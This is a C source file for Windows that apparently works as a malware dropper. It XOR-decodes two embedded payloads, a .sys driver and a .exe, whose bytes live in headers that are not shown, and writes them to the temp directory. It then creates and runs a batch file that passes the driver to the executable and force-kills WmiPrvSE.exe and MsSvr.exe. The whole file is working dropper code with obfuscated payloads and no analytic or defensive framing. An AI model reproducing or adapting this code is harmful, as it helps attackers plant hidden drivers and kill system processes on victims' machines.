#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include"sys.h"
#include"exe.h"


int main() {

	DWORD dwImageSize;
	HANDLE hFile;


	dwImageSize = sizeof(sysData);
	unsigned char* pMemory = (unsigned char*)malloc(dwImageSize);             //这回是只复制.sys文件到数组
	memcpy(pMemory, sysData, dwImageSize);
	for (ULONG i = 0; i < dwImageSize; i++)
	{
		pMemory[i] ^= 0xd8;
		pMemory[i] ^= 0xcd;
	}

	char bufPath[MAX_PATH] = { 0 };
	GetTempPathA(MAX_PATH, bufPath);
	strcat(bufPath, "2.sys");
	hFile = CreateFileA(bufPath, GENERIC_WRITE, FILE_SHARE_READ,       //拿出来
		NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		OutputDebugStringA(bufPath);
		return false;
	}
	DWORD dwByteWrite = 0;
	if (!WriteFile(hFile, pMemory, dwImageSize, &dwByteWrite, NULL))
	{
		OutputDebugStringA(bufPath);
		CloseHandle(hFile);
		return false;
	}

	if (dwByteWrite != dwImageSize)
	{
		OutputDebugStringA(bufPath);
		CloseHandle(hFile);
		return false;
	}

	// 关闭文件并释放内存
	CloseHandle(hFile);
	free(pMemory);

	//----------------------------------------------------
	// 处理 exeData（重复 sysData 的处理过程）
	dwImageSize = sizeof(exeData);  // 计算 exeData 的大小
	pMemory = (unsigned char*)malloc(dwImageSize);  // 为 exeData 分配内存
	if (pMemory == NULL) {
		OutputDebugStringA("Memory allocation failed for exeData\n");
		return false;
	}

	memcpy(pMemory, exeData, dwImageSize);  // 复制 exeData 到 pMemory
	for (ULONG i = 0; i < dwImageSize; i++) {
		pMemory[i] ^= 0xd8;  // 异或加密
		pMemory[i] ^= 0xcd;
	}

	// 获取临时路径并拼接文件名
	memset(bufPath, 0, MAX_PATH);
	GetTempPathA(MAX_PATH, bufPath);
	strcat(bufPath, "2.exe");  // 将文件名改为 2.exe

	// 创建文件并写入 exeData
	hFile = CreateFileA(bufPath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		OutputDebugStringA("Failed to create exeData file\n");
		free(pMemory);
		return false;
	}

	if (!WriteFile(hFile, pMemory, dwImageSize, &dwByteWrite, NULL)) {
		OutputDebugStringA("WriteFile failed for exeData\n");
		CloseHandle(hFile);
		free(pMemory);
		return false;
	}

	if (dwByteWrite != dwImageSize) {
		OutputDebugStringA("Byte write mismatch for exeData\n");
		CloseHandle(hFile);
		free(pMemory);
		return false;
	}

	CloseHandle(hFile);  // 关闭文件
	free(pMemory);       // 释放 exeData 内存

	//----------------------------------------------------
	// 创建并写入 1K.bat 文件
	dwByteWrite = 0;
	memset(bufPath, 0, MAX_PATH);
	char batContent[] =
		"@pushd \"%~dp0\" >nul 2>&1\n"
		"ping 127.0.0.1 -n 5\n\n"
		"2.exe 2.sys\n"
		"taskkill /F /IM WmiPrvSE.exe\n"
		"taskkill /F /IM WmiPrvSE.exe\n\n"
		"taskkill /f /im MsSvr.exe /T\n"
		"exit\n";  // 执行的批处理内容

	// 获取临时路径并拼接文件名
	GetTempPathA(MAX_PATH, bufPath);
	strcat(bufPath, "1K.bat");

	// 打印调试信息，检查路径是否正确
	OutputDebugStringA(bufPath);

	// 创建文件并写入 .bat 内容
	hFile = CreateFileA(bufPath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		DWORD err = GetLastError();
		char errMsg[128];
		snprintf(errMsg, sizeof(errMsg), "Failed to create 1K.bat file (error %lu)", err);
		OutputDebugStringA(errMsg);
		return false;
	}

	// 写入 .bat 文件内容
	if (!WriteFile(hFile, batContent, strlen(batContent), &dwByteWrite, NULL)) {
		DWORD err = GetLastError();
		char errMsg[128];
		snprintf(errMsg, sizeof(errMsg), "WriteFile failed for 1K.bat (error %lu)", err);
		OutputDebugStringA(errMsg);
		CloseHandle(hFile);
		return false;
	}

	// 检查写入的字节数
	if (dwByteWrite != strlen(batContent)) {
		char errMsg[128];
		snprintf(errMsg, sizeof(errMsg), "Byte write mismatch for 1K.bat. Expected %lu, wrote %lu.", strlen(batContent), dwByteWrite);
		OutputDebugStringA(errMsg);
		CloseHandle(hFile);
		return false;
	}

	// 关闭文件
	CloseHandle(hFile);

	//----------------------------------------------------

		// 获取临时目录
	char bufPath2[MAX_PATH];
	GetTempPathA(MAX_PATH, bufPath2);

	// 拼接批处理文件路径
	strcat(bufPath2, "1K.bat");

	// 打印调试信息
	printf("准备执行批处理文件: %s\n", bufPath2);

	// 使用 system 函数执行批处理文件
	int result = system(bufPath2);
	if (result != 0) {
		printf("执行批处理文件失败. 错误码: %d\n", result);
		return 1;
	}



	//// 定义需要执行的命令
	//const char* exeName = "1.exe";
	//const char* sys1 = "2.sys";
	//const char* sysFiles[] = { "3.sys", "4.sys", "5.sys" };

	//// 遍历每组命令并执行
	//for (int i = 0; i < sizeof(sysFiles) / sizeof(sysFiles[0]); ++i) {
	//	char command[256]; // 存储完整的命令
	//	snprintf(command, sizeof(command), "%s %s %s", exeName, sys1, sysFiles[i]);

	//	// 打印正在执行的命令
	//	printf("正在运行: %s\n", command);

	//	// 执行命令
	//	int result = system(command);
	//	if (result != 0) {
	//		printf("命令执行失败: %s\n", command);
	//	}
	//}


	// 暂停程序
	//printf("按任意键继续...\n");
	//getchar();

	return 0;
}
